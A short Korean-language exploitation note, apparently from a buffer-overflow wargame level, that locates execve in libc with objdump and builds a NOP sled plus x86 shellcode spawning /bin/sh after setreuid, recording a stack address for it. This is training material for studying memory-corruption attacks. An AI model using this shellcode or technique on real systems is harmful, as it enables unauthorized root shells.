@@ -1,0 +1,24 @@
+#execve함수 주소 구하기
+
+[bugbear@localhost bugbear]$ objdump -d /lib/libc.so.6 | grep execve
+   40cb5:	e8 8e 10 05 00       	call   91d48 <execve>
+00091d48 <execve>:
+   91d4e:	e8 00 00 00 00       	call   91d53 <execve+0xb>
+   91d64:	74 05                	je     91d6b <execve+0x23>
+   91d84:	76 0e                	jbe    91d94 <execve+0x4c>
+00091da0 <fexecve>:
+   91da4:	e8 00 00 00 00       	call   91da9 <fexecve+0x9>
+   91db4:	7c 0c                	jl     91dc2 <fexecve+0x22>
+   91dba:	74 06                	je     91dc2 <fexecve+0x22>
+   91dc0:	75 0e                	jne    91dd0 <fexecve+0x30>
+   91dcd:	eb 0c                	jmp    91ddb <fexecve+0x3b>
+   91e06:	e8 3d ff ff ff       	call   91d48 <execve>
+   91eaf:	e8 94 fe ff ff       	call   91d48 <execve>
+   91f62:	e8 e1 fd ff ff       	call   91d48 <execve>
+   a1a38:	e8 0b 03 ff ff       	call   91d48 <execve>
+   a1f18:	e8 2b fe fe ff       	call   91d48 <execve>
+
+
+#gdb로 쉘코드 주소 가져오기
+`python -c 'print "\x90"*48 + "\x90"*100 + "\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80" '`
+쉘코드 주소 : 0xbffffbe3
